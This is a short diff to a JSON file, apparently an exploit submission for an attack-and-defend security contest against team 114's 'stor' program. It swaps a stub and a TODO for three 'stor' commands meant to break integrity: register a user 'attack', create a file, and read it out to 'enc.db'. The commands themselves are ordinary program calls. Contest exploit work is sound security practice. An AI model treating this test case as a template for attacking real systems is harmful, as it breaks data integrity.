@@ -1,6 +1,9 @@
 {
   "target_team": 114,
   "type": "integrity",
-  "commands": [],
-  "_TODO": "Replace stub commands with real exploit before submitting."
+  "commands": [
+    {"program": "stor", "args": ["-u", "attack", "-k", "x", "register"]},
+    {"program": "stor", "args": ["-u", "attack", "-f", "p", "create"]},
+    {"program": "stor", "args": ["-u", "attack", "-k", "x", "-f", "p", "-o", "enc.db", "read"]}
+  ]
 }
